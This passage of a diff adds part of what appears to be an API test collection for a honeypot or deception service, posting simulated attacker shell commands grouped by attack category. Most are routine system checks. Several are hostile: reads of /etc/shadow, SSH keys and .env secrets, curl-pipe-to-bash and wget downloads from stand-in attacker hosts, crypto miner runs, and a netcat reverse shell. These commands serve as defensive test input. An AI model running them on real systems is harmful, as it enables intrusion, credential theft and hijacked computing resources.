+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"df -h\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"File System\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Check mounted disk space usage\n\nCommand: `df -h`\nCategory: `File System`"
+          }
+        },
+        {
+          "name": "du -sh /var/log",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"du -sh /var/log\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"File System\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Check directory disk usage\n\nCommand: `du -sh /var/log`\nCategory: `File System`"
+          }
+        }
+      ]
+    },
+    {
+      "name": "4. Process & Resource Monitoring",
+      "item": [
+        {
+          "name": "ps aux",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"ps aux\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Process Management\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Display all running system processes\n\nCommand: `ps aux`\nCategory: `Process Management`"
+          }
+        },
+        {
+          "name": "top -b -n 1",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"top -b -n 1\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Process Management\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Capture snapshot of system processes\n\nCommand: `top -b -n 1`\nCategory: `Process Management`"
+          }
+        },
+        {
+          "name": "free -m",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"free -m\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Resource Monitoring\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Display memory (RAM) usage in MB\n\nCommand: `free -m`\nCategory: `Resource Monitoring`"
+          }
+        },
+        {
+          "name": "systemctl status ssh",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"systemctl status ssh\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Service Management\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Check systemd service status for SSH\n\nCommand: `systemctl status ssh`\nCategory: `Service Management`"
+          }
+        },
+        {
+          "name": "dmesg | tail",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"dmesg | tail\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Kernel Logs\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Display last kernel buffer logs\n\nCommand: `dmesg | tail`\nCategory: `Kernel Logs`"
+          }
+        }
+      ]
+    },
+    {
+      "name": "5. Decoy Access & Credential Harvesting",
+      "item": [
+        {
+          "name": "cat /etc/passwd",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"cat /etc/passwd\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Credential Access\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Read user account list\n\nCommand: `cat /etc/passwd`\nCategory: `Credential Access`"
+          }
+        },
+        {
+          "name": "cat /etc/shadow",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"cat /etc/shadow\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Credential Access\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Read shadow password hashes\n\nCommand: `cat /etc/shadow`\nCategory: `Credential Access`"
+          }
+        },
+        {
+          "name": "cat /home/ubuntu/.ssh/id_rsa",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"cat /home/ubuntu/.ssh/id_rsa\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Credential Access\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Attempt reading SSH private key\n\nCommand: `cat /home/ubuntu/.ssh/id_rsa`\nCategory: `Credential Access`"
+          }
+        },
+        {
+          "name": "cat /home/ubuntu/.env",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"cat /home/ubuntu/.env\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Credential Access\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Attempt reading environment secrets\n\nCommand: `cat /home/ubuntu/.env`\nCategory: `Credential Access`"
+          }
+        },
+        {
+          "name": "cat /var/www/internal/db_backup.sql",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"cat /var/www/internal/db_backup.sql\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Credential Access\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Attempt reading database backup dump\n\nCommand: `cat /var/www/internal/db_backup.sql`\nCategory: `Credential Access`"
+          }
+        },
+        {
+          "name": "cat /var/www/internal/dev_tasks.md",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"cat /var/www/internal/dev_tasks.md\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Credential Access\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Read internal developer notes\n\nCommand: `cat /var/www/internal/dev_tasks.md`\nCategory: `Credential Access`"
+          }
+        },
+        {
+          "name": "cat /etc/gateway/router.conf",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"cat /etc/gateway/router.conf\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Credential Access\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Read router config file\n\nCommand: `cat /etc/gateway/router.conf`\nCategory: `Credential Access`"
+          }
+        },
+        {
+          "name": "grep -r password /var/www",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"grep -r \\\"password\\\" /var/www\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Credential Access\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Search for hardcoded passwords in web root\n\nCommand: `grep -r \"password\" /var/www`\nCategory: `Credential Access`"
+          }
+        }
+      ]
+    },
+    {
+      "name": "6. Malware Download & Execution",
+      "item": [
+        {
+          "name": "wget http://malware.sh/payload.sh",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"wget http://malware.sh/payload.sh\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Malware Download Attempt\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Download remote malicious script\n\nCommand: `wget http://malware.sh/payload.sh`\nCategory: `Malware Download Attempt`"
+          }
+        },
+        {
+          "name": "curl -O http://malicious-site.net/miner.exe",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"curl -O http://malicious-site.net/miner.exe\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Malware Download Attempt\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Download remote binary miner\n\nCommand: `curl -O http://malicious-site.net/miner.exe`\nCategory: `Malware Download Attempt`"
+          }
+        },
+        {
+          "name": "curl -s http://attacker.com/rev.sh | bash",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"curl -s http://attacker.com/rev.sh | bash\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Malware Download Attempt\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Pipe remote script directly to bash\n\nCommand: `curl -s http://attacker.com/rev.sh | bash`\nCategory: `Malware Download Attempt`"
+          }
+        },
+        {
+          "name": "xmrig -o pool.mine.org",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"xmrig -o pool.mine.org\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Malware Execution Attempt\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Run crypto miner binary\n\nCommand: `xmrig -o pool.mine.org`\nCategory: `Malware Execution Attempt`"
+          }
+        },
+        {
+          "name": "minerd --url pool",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"minerd --url pool\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Malware Execution Attempt\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Run minerd process\n\nCommand: `minerd --url pool`\nCategory: `Malware Execution Attempt`"
+          }
+        },
+        {
+          "name": "./tmp/miner",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"./tmp/miner\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Malware Execution Attempt\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Execute local miner script\n\nCommand: `./tmp/miner`\nCategory: `Malware Execution Attempt`"
+          }
+        },
+        {
+          "name": "base64 -d exploit.b64 > exploit",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"base64 -d exploit.b64 > exploit\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Malware Execution Attempt\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Decode base64 encoded exploit payload\n\nCommand: `base64 -d exploit.b64 > exploit`\nCategory: `Malware Execution Attempt`"
+          }
+        }
+      ]
+    },
+    {
+      "name": "7. Privilege Escalation & Exploitation",
+      "item": [
+        {
+          "name": "find / -perm -4000 -type f 2>/dev/null",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"find / -perm -4000 -type f 2>/dev/null\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Privilege Escalation Attempt\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Search for SUID binaries\n\nCommand: `find / -perm -4000 -type f 2>/dev/null`\nCategory: `Privilege Escalation Attempt`"
+          }
+        },
+        {
+          "name": "pkexec --version",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"pkexec --version\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Privilege Escalation Attempt\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Check Polkit pkexec version\n\nCommand: `pkexec --version`\nCategory: `Privilege Escalation Attempt`"
+          }
+        },
+        {
+          "name": "dirtycow",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"dirtycow\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Privilege Escalation Attempt\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Execute DirtyCOW exploit attempt\n\nCommand: `dirtycow`\nCategory: `Privilege Escalation Attempt`"
+          }
+        },
+        {
+          "name": "sudo -l",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"sudo -l\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Privilege Escalation Attempt\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Check allowed sudo commands\n\nCommand: `sudo -l`\nCategory: `Privilege Escalation Attempt`"
+          }
+        }
+      ]
+    },
+    {
+      "name": "8. Permission Manipulation",
+      "item": [
+        {
+          "name": "chmod +x payload.sh",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"chmod +x payload.sh\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Permission Manipulation\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Add execute permission to script\n\nCommand: `chmod +x payload.sh`\nCategory: `Permission Manipulation`"
+          }
+        },
+        {
+          "name": "chmod 777 /var/www/html/uploads",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"chmod 777 /var/www/html/uploads\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Permission Manipulation\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Make web uploads directory world-writable\n\nCommand: `chmod 777 /var/www/html/uploads`\nCategory: `Permission Manipulation`"
+          }
+        }
+      ]
+    },
+    {
+      "name": "9. Reverse Shell & Network Tunnels",
+      "item": [
+        {
+          "name": "nc -lvp 4444",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"nc -lvp 4444\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Reverse Shell Attempt\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Start Netcat listener on port 4444\n\nCommand: `nc -lvp 4444`\nCategory: `Reverse Shell Attempt`"
+          }
+        },
+        {
+          "name": "netcat -e /bin/bash 10.0.0.5 8080",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"netcat -e /bin/bash 10.0.0.5 8080\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Reverse Shell Attempt\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Execute reverse shell connection to remote listener\n\nCommand: `netcat -e /bin/bash 10.0.0.5 8080`\nCategory: `Reverse Shell Attempt`"
+          }
+        },
+        {
+          "name": "telnet 10.0.0.1 23",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
